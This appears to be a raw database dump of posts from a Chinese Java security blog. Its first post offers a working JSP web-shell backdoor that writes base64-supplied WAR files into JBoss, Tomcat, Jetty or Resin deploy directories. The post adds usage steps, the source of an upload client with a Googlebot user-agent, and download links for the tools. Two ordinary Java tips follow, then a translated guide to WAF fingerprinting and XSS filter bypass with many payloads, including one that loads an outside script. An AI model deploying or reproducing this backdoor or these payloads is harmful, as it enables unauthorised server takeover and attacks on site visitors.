true\">&lt;%@page\n	import=&quot;java.io.*, \n    java.util.*, \n    sun.misc.BASE64Decoder&quot;%&gt;\n&lt;%\n	String PJdpj = &quot;&quot;;\n	String pIGx = &quot;&quot;;\n	String RSVw = System.getProperty(&quot;jboss.server.home.dir&quot;);\n	if (request.getParameter(&quot;pUBYyDsT&quot;) != null) {\n		try {\n			PJdpj = request.getParameter(&quot;pUBYyDsT&quot;);\n			pIGx = request.getParameter(&quot;oAEICWIo&quot;);\n			byte[] rFPE = new BASE64Decoder().decodeBuffer(PJdpj);\n			String MfNJU = RSVw + &quot;/deploy/&quot; + pIGx + &quot;.war&quot;;\n			FileOutputStream twkH = new FileOutputStream(MfNJU);\n			twkH.write(rFPE);\n			twkH.close();\n		} catch (Exception e) {\n		}\n	} else {\n		try {\n			String VBpM = request.getParameter(&quot;oAEICWIo&quot;);\n			String dhkDS = RSVw + &quot;/deploy/&quot; + VBpM + &quot;.war&quot;;\n			new File(dhkDS).delete();\n		} catch (Exception e) {\n		}\n	}\n%&gt;</pre>\n<p>挺聪明的Server一般都提供了自动部署服务，也就是说只需要把war包放到默认能够自动部署的目录就行了。</p>\n<p>POST提交：http://xxx.com/xxx.jsp</p>\n<p>参数：</p>\n<p>pUBYyDsT＝war文件的Basr64编码&amp;oAEICWIo＝Test</p>\n<p>然后请求http://xxx.com/Test就getshell了。Test是war文件的项目名。</p>\n<p>只需简单的改改<span style=\"font-family: Consolas, Monaco, monospace; font-size: 12px; line-height: 18px;\">getProperty的属性值</span>就能够通用到Tomcat等Server.</p>\n<p>客户端工具：</p>\n<p><a href=\"http://pan.baidu.com/s/1eQ212JC\">Upload_War_后门.jar</a></p>\n<p><a href=\"http://pan.baidu.com/s/1EKwVm\">iswin.war</a></p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/01/11.jpg\"><img class=\"alignnone size-full wp-image-494\" title=\"1\" src=\"http://javaweb.org/wp-content/uploads/2014/01/11.jpg\" alt=\"\" width=\"458\" height=\"311\" /></a></p>\n<p>源码：</p>\n<pre class=\"brush: java; gutter: true\">private void jButton1ActionPerformed(java.awt.event.ActionEvent evt) {\n    	String war = jTextField3.getText();\n    	if(war!=null){\n            try {\n            	FileInputStream fis = new FileInputStream(new File(war));\n            	byte[] b = new byte[1024];\n        		int n = 0;\n        		ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        		while((n=fis.read(b))!=-1){\n        			baos.write(b,0,n);\n        		}\n				String content = new BASE64Encoder().encode(baos.toByteArray());\n				fis.close();\n				Map&lt;String,String&gt; map = new HashMap&lt;String, String&gt;();\n				map.put(&quot;oAEICWIo&quot;, jTextField2.getText());\n				map.put(&quot;pUBYyDsT&quot;, content);\n				Jsoup.connect(jTextField1.getText()).data(map).userAgent(&quot;Googlebot/2.1 (+http://www.googlebot.com/bot.html&quot;).timeout(30000).post();\n				jTextArea1.setText(&quot;请求成功...&quot;);\n			} catch (Exception e) {\n				jTextArea1.setText(e.toString());\n			}\n    	}\n    }\n    private void jButton2ActionPerformed(java.awt.event.ActionEvent evt) {     \n    	int result = 0;  \n    	String path = null;\n    	JFileChooser fileChooser = new JFileChooser();  \n    	FileSystemView fsv = FileSystemView.getFileSystemView();\n    	fileChooser.setCurrentDirectory(fsv.getHomeDirectory());  \n    	fileChooser.setDialogTitle(&quot;请选择war文件.&quot;);  \n    	fileChooser.setApproveButtonText(&quot;确定&quot;);  \n    	fileChooser.setFileSelectionMode(JFileChooser.FILES_ONLY);  \n    	result = fileChooser.showOpenDialog(fileChooser);  \n    	if (JFileChooser.APPROVE_OPTION == result) {  \n    	    path=fileChooser.getSelectedFile().getPath();\n    	}\n    	jTextField3.setText(path);\n    }</pre>\n<p>修改后的jsp后门：</p>\n<pre class=\"brush: java; gutter: true\">&lt;%@page import=&quot;java.io.*,java.util.*,sun.misc.BASE64Decoder&quot;%&gt;\n&lt;%!\n	String getServer(HttpServletRequest request,String name){\n		if(name.indexOf(&quot;jboss&quot;)!=-1){\n			return System.getProperty(&quot;jboss.server.home.dir&quot;)+&quot;/deploy/&quot;;\n		}else if(name.indexOf(&quot;jetty&quot;)!=-1){\n			return System.getProperty(&quot;jetty.home&quot;)+&quot;/webapps/&quot;;\n		}else if(name.indexOf(&quot;resin&quot;)!=-1){\n			return System.getProperty(&quot;resin.home&quot;)+&quot;/webapps/&quot;;\n		}\n		return System.getProperty(&quot;catalina.home&quot;)+&quot;/webapps/&quot;;\n	}\n%&gt;\n&lt;%\n	String PJdpj = request.getParameter(&quot;pUBYyDsT&quot;);\n	if (PJdpj!= null) {\n		try {\n			String RSVw = getServer(request, application.getServerInfo().toLowerCase()).replaceAll(&quot;\\\\\\\\&quot;, &quot;/&quot;)+request.getParameter(&quot;oAEICWIo&quot;)+&quot;.war&quot;;\n			FileOutputStream twkH = new FileOutputStream(RSVw);\n			twkH.write(new BASE64Decoder().decodeBuffer(PJdpj));\n			twkH.close();\n			String dhkDS = RSVw+ &quot;.war&quot;;\n			new File(dhkDS).delete();\n		} catch (Exception e) {\n		}\n	}\n%&gt;</pre>', null, '2014-01-07 16:38:20', '1', '813', null, '0', '2014-02-27 11:33:30'), ('498', '1', '3', 'Java 快速遍历目录(FilenameFilter正则)', '园长', '遍历目录下所有文件名中带有.jsp的不管是1.jsp还是1.jspx或者是1.JsPx,如果不用Filte的话，每次需要读取的文件数会非常多影响速度。简单的看了下实现Java IO的<span style=\"font-family: Consolas, Monaco, monospace; font-size: 12px; line-height: 18px;\">FilenameFilter和FileFilter接口是最佳的选择。</span>\n<pre class=\"brush: java; gutter: true\">import java.io.File;\nimport java.io.FilenameFilter;\nimport java.util.Collection;\nimport java.util.LinkedHashSet;\nimport java.util.regex.Pattern;\npublic class Dirs implements FilenameFilter{\n	static int c = 0;\n	public void test(Collection&lt;File&gt; f,File file){\n		c++;\n		if(file.isDirectory()){\n			String[] files = file.list(this);\n			for (int i = 0; i &lt; files.length; i++) {\n				test(f,new File(file, files[i]));\n			}\n		}else{\n			f.add(file);\n		}\n	}\n	public boolean accept(File dir, String name) {\n		return Pattern.compile(&quot;\\\\.jsp&quot;,Pattern.CASE_INSENSITIVE|Pattern.DOTALL).matcher(name).find()||new File(dir,name).isDirectory();\n	}\n	public static void main(String[] args) {\n		Dirs t = new Dirs();\n		long stime = System.currentTimeMillis();//开始时间\n		Collection&lt;File&gt; f = new LinkedHashSet&lt;File&gt;();\n		t.test(f,new File(&quot;/Users/&quot;));\n		for(File a:f){\n			System.out.println(a);\n		}\n		System.out.println(&quot;读取:&quot;+c+&quot;,&quot;+(System.currentTimeMillis()-stime)+&quot;ms&quot;);\n	}\n}</pre>\n<p>Apache Commons IO 的FileUtils类，虽然提供了类似的方法，但是带递归遍历和后缀过滤的方法都是用的endWith比较的后缀，默认大小写敏感，贴出来仅供参考。</p>\n<pre class=\"brush: java; gutter: true\">import java.io.File;\nimport java.util.Collection;\nimport org.apache.commons.io.FileUtils;\npublic class ApacheCommonIO {\n	public static void main(String[] args) {\n		long stime = System.currentTimeMillis();\n		Collection&lt;File&gt; f = FileUtils.listFiles(new File(&quot;/Users/&quot;),new String[]{&quot;jsp&quot;,&quot;java&quot;}, true);\n		for(File a:f){\n			System.out.println(a);\n		}\n		System.out.println(System.currentTimeMillis()-stime+&quot;ms&quot;);\n	}\n}</pre>', null, '2014-01-11 01:55:32', '1', '586', null, '0', '2014-01-11 02:04:55'), ('514', '1', '3', 'java.lang.UnsupportedOperationException', '园长', '本想直接把String xxx = \"a,b,c\";转成List然后再add的，结果发现报错了。\n<pre class=\"brush: java; gutter: true\">List&lt;String&gt; ls = Arrays.asList(list.split(&quot;,&quot;));  \nls.add(xxx);</pre>\n<p>java.lang.UnsupportedOperationException,修改下就好了。</p>\n<pre class=\"brush: java; gutter: true\">List&lt;String&gt; ls = new ArrayList&lt;String&gt;();\nString[] x = list.split(&quot;,&quot;);\nfor(String s:x){\n	ls.add(s);\n}</pre>\n<p>或者：List&lt;String&gt; ls =  new ArrayList&lt;String&gt;(Arrays.asList(list.split(\",\")));</p>\n<p>http://blog.csdn.net/howareyouo/article/details/8682726</p>\n<p>通过Arrays.asList(Object...array)拿到的List是个AbstractList, 是抽象类, 并没有实现add(), remove()等方法, 而是直接抛出这个UnsupportedOperationException,</p>\n<p>有人说通过循环遍历插入到new 出来的List里,  其实不用这么麻烦:</p>\n<pre class=\"brush: java; gutter: true\">String[] opers = request.getParameterValues(&quot;opers&quot;);\nList&lt;String&gt; operList = opers == null ? new ArrayList&lt;String&gt;(0) : new ArrayList&lt;&gt;(Arrays.asList(opers));</pre>\n<p>这里拿到的operList就可以进行add, remove等方法了..</p>', null, '2014-01-14 16:53:00', '1', '513', null, '0', '2014-01-15 22:21:51'), ('518', '5', '14', '[Cnblog-r00tgrok]译文:WAF指纹识别和XSS过滤器绕过技巧', 'Anonymous', 'FROM:http://www.cnblogs.com/r00tgrok/p/Bypass_WAF_and_XSS_Filter.html\n<p><strong>0x1 前言</strong></p>\n<p>之前在乌云drops上看到一篇绕过WAF跨站脚本过滤器的一些技巧，是从老外的一篇paper部分翻译过来的，可以说文章摘取了原文最核心的部分并对文字做了简要翻译，<a href=\"http://drops.wooyun.org/tips/845\" target=\"_blank\">Bypass XSS过滤的测试方法</a>。看完后觉得确实讲得比较全面和细致，然后找出了英文原文的paper，看了一下并画蛇添足的进行了下翻译，翻译得不好但算是有了篇完整的中文paper。</p>\n<p><strong>0x2 正文</strong></p>\n<p><strong>摘要：</strong></p>\n<p>众所周知，过去多年以来信息安全领域的划分出现了。web应用正遭受攻击，从这个角度来说，WAF(Web Application Firewalls)变得越来越流行，通常而言，各种机构会使用它来防范包括SQL注入、跨站脚本和远程命令执行在内的各种攻击。</p>\n<p>web应用依旧是网络犯罪的一个主要攻击向量，数据显示网络犯罪并没有减少的迹象。攻击者现在越来越多地通过通过跨站脚本、SQL注入和其他一些渗透技术对应用层发起攻击。</p>\n<p>web应用中的漏洞作为一个攻击目标可以归根于很多问题，包括：脆弱的输入验证、会话管理、不正确的系统设置及操作系统和服务器软件的缺陷。值得注意的是，犯错是人类的天性。实际上，编写安全的代码是减少web应用程序中漏洞的最有效方法。然而，在编程时我们免不了要出错，编写安全的代码说的远比做起来要简单，而且这还会涉及几个关键的问题。</p>\n<p><strong>1.1 基本概念</strong></p>\n<p>web应用中缺乏对用户输入参数和服务端响应的有效验证会引发XSS，这种攻击可以在目标用户的浏览器中插入任意HTML代码。</p>\n<p>从技术上来说，当用户的输入参数在浏览器中完全显示出来时就会出现这个问题，比如javascript代码能被解析为合法程序的一部分并能访问文档的所有实体(DOM)。现实中，在用户浏览器中修改脆弱应用程序的HTML文档或者使用网络钓鱼都会引发攻击，XSS攻击通常通过控制输入字段实现大量网站的脚本注入。</p>\n<p><strong>1.2 介绍</strong></p>\n<p>Firewalls、IDS、IPS是用于保护基础设施免于恶意攻击的最常见的安全机制。其中，防火墙最为常用的安全机制，通常置于网络层和应用层，通过基于预配置的注册签名数据库监控客户端和服务器端的HTTP和HTTPS流量，以此分析恶意数据包。</p>\n<p>一般来说，基于网络的应用层防火墙的基本目标是监控和阻塞违背了预定义策略的用户内容，有时候这些策略匹配可能成为潜在攻击的用户输入模式。通过WAF的规则在语义上而言和XSS的攻击载荷是一样的，关键在于避免处罚安全策略。</p>\n<p>WAF依赖于最常见的两项措施，即白名单和黑名单，白名单意味着仅允许当前数据库中白名单上的成员通过，而黑名单则会尝试过滤掉不被允许的通过。最常见的方法是使用黑名单，意味着会过滤掉那些已知的不可靠的，然而设置黑名单并不是正确的方法，它依赖于可以被绕过的黑名单列表。本文着重于解释各种能绕过WAF的方法，尤其是那些依赖于黑名单机制的WAF。</p>\n<p><strong>2.1 指纹识别WAF</strong></p>\n<p>在这一节中，我们会学习一些识别WAF的技巧。侦查是行动的第一步，在绕过前先知道我们面对的是什么是很重要的。一些WAF会在cookie值或http响应中留下明显的标记，这让我们能很容易的检测出我们面对的是什么WAF。</p>\n<p><strong>2.1.1 Cookie值</strong></p>\n<p>一些WAF会在HTTP通信中加上它们唯一的cookie，这对攻击者来说是非常有用的。</p>\n<p><strong>2.1.2 指纹识别 Citrix Netscaler</strong></p>\n<p>Citrix Netscaler便一个例子，下面是向一个部署了Citrix Netscaler的应用发起的简单而非恶意的GET请求</p>\n<pre class=\"brush: actionscript3; gutter: true\">GET / HTTP/1.1\nHost: target.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:25.0) Gecko/20100101 Firefox/25.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nCookie: ASPSESSIONIDAQQSDCSC=HGJHINLDNMNFHABGPPBNGFKC; \nns_af=31+LrS3EeEOBbxBV7AWDFIEhrn8A000;ns_af_.target.br_%2F_wat=QVNQU0VTU0lPTklEQVFRU0RDU0Nf?6IgJizHRbTRNuNoOpbBOiKRET2gA&amp;\nConnection: keep-alive\nCache-Control: max-age=0</pre>\n<p>高亮部分标红(ns_af)是netscaler在GET请求中添加的cookie，这暗示了该应用的背后运行中citrix netscaler</p>\n<p><strong>2.1.3 指纹识别 F5 BIG IP ASM</strong></p>\n<p>F5是有着深层检测功能的世界知名web应用防火墙，类似于citrix netscaler，F5 BiG IP ASM也会在它们的HTTP通信中添加特定的cookie。下面是提交给有F5防火墙的应用一个非恶意GET请求：</p>\n<pre class=\"brush: actionscript3; gutter: true\">GET / HTTP/1.1\nHost: www.target.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:25.0) Gecko/20100101 Firefox/25.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nCookie: target_cem_tl=40FC2190D3B2D4E60AB22C0F9EF155D5; s_fid=77F8544DA30373AC-31AE8C79E13D7394; s_vnum=1388516400627%26vn%3D1;\ns_nr=1385938565978-New; s_nr2=1385938565979-New; s_lv=1385938565980; s_vi=[CS]v1|294DCEC0051D2761-40000143E003E9DC[CE]; \nfe_typo_user=7a64cc46ca253f9889675f9b9b79eb66; \nTSe3b54b=36f2896d9de8a61cf27aea24f35f8ee1abd1a43de557a25c529fe828; \nTS65374d=041365b3e678cba0e338668580430c26abd1a43de557a25c529fe8285a5ab5a8e5d0f299\nConnection: keep-alive\nCache-Control: max-age=0</pre>\n<p><strong>2.1.4 HTTP Response</strong></p>\n<p>其他WAF可以通过提交恶意请求后的HTTP响应类型来检测，每款WAF的响应各不相同，比较常见的有403、406、419、500、501等</p>\n<p><strong>2.1.5 指纹识别Mod_Security</strong></p>\n<p>Mod_security是一款针对Apache服务器而设计的开源WAF，由于是开源的，Mod_security曾被多次绕过，但也因此其检测能力有了重大的提升。一个恶意请求被发送给部署了mod_security的应用后返回一个“406 Not acceptable”错误，在响应体中也暗示了该错误由mod_security生成。</p>\n<p><strong>请求：</strong></p>\n<pre class=\"brush: actionscript3; gutter: true\">GET /&lt;script&gt;alert(1);&lt;/script&gt;HTTP/1.1\nHost: www.target.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:25.0) Gecko/20100101 Firefox/25.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: keep-alive</pre>\n<p><strong>响应：</strong></p>\n<pre class=\"brush: actionscript3; gutter: true\">HTTP/1.1 406 Not Acceptable\nDate: Thu, 05 Dec 2013 03:33:03 GMT\nServer: Apache\nContent-Length: 226\nKeep-Alive: timeout=10, max=30\nConnection: Keep-Alive\nContent-Type: text/html; charset=iso-8859-1\n&lt;head&gt;&lt;title&gt;Not Acceptable!&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Not Acceptable!&lt;/h1&gt;&lt;p&gt;An appropriate representation of the requested resource could not be found on this server. This error was generated by Mod_Security.&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;</pre>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/01/01.jpg\"><img class=\"alignnone size-full wp-image-519\" title=\"01\" src=\"http://javaweb.org/wp-content/uploads/2014/01/01.jpg\" alt=\"\" width=\"882\" height=\"173\" /></a></p>\n<p><strong>2.1.5 指纹识别WebKnight</strong></p>\n<p>Webknight是另一款非常流行的WAF，针对IIS服务器而设计。Webknight使用黑名单机制并查找诸如SQL注入、路径遍历、XSS攻击的特征，不同于其他WAF，识别Webknight非常容易，一个恶意请求返回\"999 No Hacking\"</p>\n<p><strong>请求：</strong></p>\n<pre class=\"brush: actionscript3; gutter: true\">GET /?PageID=99&lt;script&gt;alert(1);&lt;/script&gt;HTTP/1.1\nHost: www.aqtronix.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:25.0) Gecko/20100101 Firefox/25.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: keep-alive</pre>\n<p><strong>响应：</strong></p>\n<pre class=\"brush: actionscript3; gutter: true\">HTTP/1.1 999 No Hacking\nServer: WWW Server/1.1\nDate: Thu, 05 Dec 2013 03:14:23 GMT\nContent-Type: text/html; charset=windows-1252\nContent-Length: 1160\nPragma: no-cache\nCache-control: no-cache\nExpires: Thu, 05 Dec 2013 03:14:23 GMT</pre>\n<p><strong>2.1.6 识别F5 BIG IP</strong></p>\n<p>发送给F5 BIG IP的恶意请求会返回“419 Unknown”响应，这个也可以作为F5的指纹，即便请求中cookie值被隐藏了</p>\n<p><strong>请求：</strong></p>\n<pre class=\"brush: actionscript3; gutter: true\">GET /&lt;script&gt; HTTP/1.0\nHTTP/1.1 419 Unknown\nCache-Control: no-cache\nContent-Type: text/html; charset=iso-8859-15\nPragma: no-cache\nContent-Length: 8140\nDate: Mon, 25 Nov 2013 15:22:44 GMT\nConnection: keep-alive\nVary: Accept-Encoding</pre>\n<p><strong>2.1.7 识别dotDefender</strong></p>\n<p>dotDefender是另一款为保护.net应用程序而设计的知名WAF，同Mod_security和Webknight类似，在发送恶意请求后dotDefender会在响应体中包含暗示自身的信息</p>\n<p><strong>请求：</strong></p>\n<pre class=\"brush: actionscript3; gutter: true\">GET /---HTTP/1.1\nHost: www.acc.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:25.0) Gecko/20100101 Firefox/25.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: keep-alive\nCache-Control: max-age=0</pre>\n<p><strong>响应：</strong></p>\n<pre class=\"brush: actionscript3; gutter: true\">HTTP/1.1 200 OK\nCache-Control: no-cache\nContent-Type: text/html\nVary: Accept-Encoding\nServer: Microsoft-IIS/7.5\nX-Powered-By: ASP.NET\nDate: Thu, 05 Dec 2013 03:40:14 GMT\nContent-Length: 2616\n&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD XHTML 1.0 Frameset//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-frameset.dtd&quot;&gt;\n&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;\n&lt;head&gt;\n&lt;title&gt;dotDefender Blocked Your Request&lt;/title&gt;</pre>\n<p><strong>2.2.1 用Wafw00f自动指纹识别</strong></p>\n<p>一些WAF足够聪明，会在cookie值和HTTP响应中隐藏自己的标记，这意味着即便你发送一个恶意的请求，响应永远都是“200 ok”，在这种情况下我们需要额外的测试来识别这种WAF的指纹。幸运的是，我们可以使用Wafw00f来节省我们的时间。</p>\n<p>Wafw00f是一个python写的、专门用于指纹识别WAF的小工具，它生成5种不同的测试来检测WAF，例如跟踪http请求里面的cookies、分析发送恶意请求收到的http响应、使用丢FIN和RST数据包的方法并查看收到的响应、服务器隐藏、修改URL、选择http方法及测试从一个WAF到另一个WAF的预建的否定签名。</p>\n<p>让我们直接从wafw00f源代码看一下它使用的检测方法。下面的几个截图演示了几个作为http请求发送的攻击向量，包含了常用的XSS字符串、遍历/etc/passwd的尝试及一个干净的HTML字符串。这些是最WAF一开始就会阻塞的常用特征，发送背后的意图是引起WAF触发一个唯一的错误以帮助wafw00f识别部署在应用后的WAF</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/01/02.jpg\"><img class=\"alignnone size-full wp-image-520\" title=\"02\" src=\"http://javaweb.org/wp-content/uploads/2014/01/02.jpg\" alt=\"\" width=\"346\" height=\"114\" /></a></p>\n<p><strong>2.2.2 基于Cookie的检测</strong></p>\n<p>wafw00f使用的最常见的类型是基于cookie的检测，下面的截图演示了使用正则表达式匹配特定的cookie，在本例中是F5asm和F5trafficsheild。注意到F5 traffic sheild也会在服务器头里返回\"F5-TrafficSheild\"，而这就是我们要找的代码</p>\n<p><strong>2.2.3 匹配HTTP响应</strong></p>\n<p>第二常见的类型检测方法是匹配http响应，我们之前已了解到有些WAF的响应含有独一无二的http响应代码，这有助于我们识别使用的WAF。下面的代码用于检测应用背后是否部署了\"webKnight\"防火墙，它发送一个攻击向量并匹配响应代码是否为\"999\"，我们前面已经发现当WebKnight收到一个恶意请求时会抛出“999”</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/01/03.jpg\"><img class=\"alignnone size-full wp-image-521\" title=\"03\" src=\"http://javaweb.org/wp-content/uploads/2014/01/03.jpg\" alt=\"\" width=\"556\" height=\"210\" /></a></p>\n<p><strong>2.2.4 WAF清单</strong></p>\n<p>wafw00f中的-list参数可以被用来确定wafw00f目前能检测的waf</p>\n<pre class=\"brush: python; gutter: true\">def iswebknight(self):\n　　detected = False\n　　for attack in self.attacks:\n　　　　r = attack(self)\n　　　　if r is None:\n　　　　Return\n　　response,responsebody= r\n　　if response.status== 999:\n　　　　detected =True\n　　　　Break\nreturn detected</pre>\n<p><strong>2.2.5 使用工具</strong></p>\n<p>这个工具很容易使用，你只需执行下面的命令即可</p>\n<p><div></p>\n<pre>./wafw00f.py http://www.target.com</pre>\n</div>\n<strong>3.1 绕过黑名单</strong>\n我们知道，为了节省时间大部分WAF提供商会使用黑名单进行否定，这意味着他们有一个包含复杂正则表达式的签名数据库，使用这个数据库可以查询他们试图阻塞的模式。问题在于这种基于黑名单的保护方法可以被绕过，因为javascript是如此灵活，这取决于具体于上下文。我们有成千上万的方式可以使用javascript绕过基于黑名单的保护机制，这也是我们在这一节要讨论的。\n有三种绕过黑名单的方法：\n1)暴力破解\n2)正则逆向\n3)浏览器bug\n<strong>3.1.2 暴力破解</strong>\n在暴力破解方法中，我们一般会抛出大量的攻击载荷并期望它们能触发，这也是大多数自动化工具和扫描器使用的方式。这种方法对一些过滤器而言可能是有效的，但是在真实环境中却常常会失败，因为自动化扫描器不理解上下文内容，而我们的攻击载荷在不同上下文中也是不同的。\n<strong>3.1.3 正则逆向</strong>\n这是绕过WAF的最佳方式，之前说过WAF依赖于使用它们数据库中的前面来匹配攻击载荷。这些指纹大多数是以复杂的正则表达式的形式存在，如果攻击载荷匹配了规则库中的正则就会触发WAF，但是如果不匹配则不会触发。使用这种方法，我们需要花点时间来逆向猜测WAF的指纹，一旦知道了WAF的阻塞规则，我们就可以构造不会触发WAF规则的攻击载荷和有效的javascript语法。\n<strong>3.1.4 浏览器Bug</strong>\n当上面两种方法都没法成功，利用浏览器漏洞则是我们剩下的最后一种办法了，绕过浏览器的关键在于我们要比供应商更加了解浏览器的机制。我们常常会遇到有着完整规则的WAF，使用现代浏览器我们没法绕过黑名单，因此我们将阵地转移至更旧的浏览器版本，看是否有已公布的bug或者能否找到一个0 day。继续尝试，我们可以发现一些浏览器bug，并看看怎样才能用它们绕过WAF。\n<strong>4.1 绕过黑名单的方法 – Cheat Sheet</strong>\n本节我们会看一下绕过黑名单的方法和方式，同样我还会在本节中谈及暴力破解和逆向正则的方法。\n<strong>4.1.1 初始测试</strong>\n1)尝试插入无害的HTML载荷如&lt;b&gt;,&lt;i&gt;,&lt;u&gt;，观察它们是否会被阻塞，http响应是怎样的。是否被html编码了、标签和尖括号是否被过滤了、是否有替换发生。\n2)如果开或闭标签被剔除了，尝试插入未闭合的标签(&lt;b,&lt;i,&lt;u,&lt;marquee)。观察是否过滤了开标签、插入的代码表现是否完美。如果表现得很完美，这意味着正则表达式会查找有着开合闭标签的html元素，而不会对开标签进行过滤。\n3)接下来试一下99.99%的xss过滤器都会过滤的XSS载荷：\n<pre class=\"brush: html; gutter: true\">&lt;script&gt;alert(1);&lt;/script&gt;\n&lt;script&gt;prompt(1);&lt;/script&gt;\n&lt;script&gt;confirm (1);&lt;/script&gt;\n&lt;script src=&quot;http://rhainfosec.com/evil.js&quot;&gt;</pre>\n<p>你收到的响应是什么呢，它触犯了403 forbidden页面还是500错误？是否在http响应中完全剔除了整条语句了？或者只是部分剔除了，你还剩下alert、prompt、confrom？如果是这样的话，()是否也被过滤了呢？</p>\n<p>接下来，试着注入大小写组合的代码，说不定只有小写会被过滤。</p>\n<pre class=\"brush: javascript; gutter: true\">&lt;scRiPt&gt;alert(1);&lt;/scrIPt&gt;</pre>\n4)假设大小写组合无法绕过过滤器，我们还可以使用嵌套的标签.\n<pre class=\"brush: javascript; gutter: true\">&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;script&gt;ipt&gt;</pre>\n这种情况下，过滤器会剔除&lt;script&gt;和&lt;/script&gt;标签，当外层的标签被过滤后&lt;scr ipt&gt;会结合起来形成合法的JavaScript代码，这样你就能绕过限制了\n5)接下来我们会使用&lt;a href标签，看它会返回什么\n<pre class=\"brush: html; gutter: true\">&lt;a href=”http://www.google.com&gt;Google Search&lt;/a&gt;</pre>\n&lt;a标签被过滤了吗？\nhref被过滤了吗？\nhref里面的数据被过了了吗？\n如果标签都没有过滤掉，我们可以在href标签里面插入javascript语句\n<pre>&lt;a href=”javascript:alert(1)”&gt;Clickme&lt;/a&gt;</pre>\n它触发了错误吗？\n是否href里面的整个javascript标签都被剔掉了，或者仅剔除了\"javaScript\"？\n试一下混合的大小写能否绕过\n如果我们在href标签中，但javascript关键字被过滤了，还有很多不同的编码类型可供使用，后面会说到。接下来我们试一下使用事件处理执行Javascript代码\n<div>\n<pre>&lt;a href=&quot;www.cnblogs.com/r00tgrok&quot; onmouseover=alert(1)&gt;ClickHere&lt;/a&gt;</pre>\n</div>\n事件处理被删掉了吗？\n还是说仅仅过滤了\"on\"后面的\"mouseover\"\n接下来插入一个无效的事件处理检验是否所有的事件处理都会被过滤或者仅部分会被过滤\n<div>\n<pre>&lt;a href=&quot;www.cnblogs.com/r00tgrok&quot; onclimbatree=alert(1)&gt;ClickHere&lt;/a&gt;</pre>\n</div>\n收到相同的响应了吗？\n你能注入吗？\n如果我们可以注入无效的事件处理且\"on\"部分并未过滤，这意味着会过滤特定的事件处理。在HTML5中，我们有超过150种事件处理，这也意味着我们有150多种方法执行javascript，一个显著的变化是事件处理不会被过滤掉。一个很少被过滤的事件处理为\"onhashchange\"：\n<div>\n<pre>&amp;lt;body/onhashchange=alert(1)&amp;gt;&amp;lt;a href=#&amp;gt;click me&lt;span style=&quot;font-family: Georgia, &#039;Times New Roman&#039;, &#039;Bitstream Charter&#039;, Times, serif; font-size: 13px; line-height: 19px;&quot;&gt; &lt;/span&gt;</pre>\n</div>\n<strong>4.1.2 测试其他标签</strong>\n接下来我们尝试一下其他常用能生成有效javascript语法的标签和属性\n<strong>src属性：</strong>\n接下来我们会测试src属性是否会被过滤，有很多html标签都可以使用src属性执行JavaScript代码\n<div>\n<pre>&lt;img src=x onerror=prompt(1);&gt;\n&lt;img/src=aaa.jpg onerror=prompt(1);&gt;\n&lt;video src=x onerror=prompt(1);&gt; \n&lt;audio src=x onerror=prompt(1);&gt;</pre>\n<p></div></p>\n<p><strong>iframe：</strong></p>\n<p><div></p>\n<pre>&lt;iframesrc=&quot;javascript:alert(2)&quot;&gt;\n&lt;iframe/src=&quot;data:text&amp;sol;html;&amp;Tab;base64&amp;NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==&quot;&gt;</pre>\n<p></div></p>\n<p><strong>embed标签：</strong></p>\n<p><div></p>\n<pre>&lt;embed/src=//goo.gl/nlX0P&gt;</pre>\n</div>\n<strong>action属性:</strong>\naction是另外一个可以用于执行javascript脚本的属性，通常用于&lt;form、&lt;isindex等元素中\n<div>\n<pre>&lt;form action=&quot;Javascript:alert(1)&quot;&gt;&lt;input type=submit&gt;\n&lt;isindex action=&quot;javascript:alert(1)&quot; type=image&gt;\n&lt;isindex action=j&amp;Tab;a&amp;Tab;vas&amp;Tab;c&amp;Tab;r&amp;Tab;ipt:alert(1) type=image&gt;</pre>\n<p></div></p>\n<p><strong>变种：</strong></p>\n<p><div></p>\n<pre>&lt;formaction=&#039;data:text&amp;sol;html,&amp;lt;script&amp;gt;alert(1)&amp;lt/script&amp;gt&#039;&gt;&lt;button&gt;CLICK</pre>\n</div>\n<strong>formaction属性：</strong>\n<div>\n<pre>&lt;isindexformaction=&quot;javascript:alert(1)&quot; type=image&gt;\n&lt;input type=&quot;image&quot; formaction=JaVaScript:alert(0)&gt;\n&lt;form&gt;&lt;button formaction=javascript&amp;colon;alert(1)&gt;CLICKME</pre>\n<p></div></p>\n<p><strong>background属性：</strong></p>\n<p><div></p>\n<pre>&lt;table background=javascript:alert(1)&gt;&lt;/table&gt; // Works on Opera 10.5 and IE6</pre>\n</div>\n<strong>poster属性：</strong>\n<div>\n<pre>&lt;video poster=javascript:alert(1)//&gt;&lt;/video&gt; // Works Upto Opera 10.5</pre>\n</div>\n<strong>data属性：</strong>\n<div>\n<pre>&lt;object 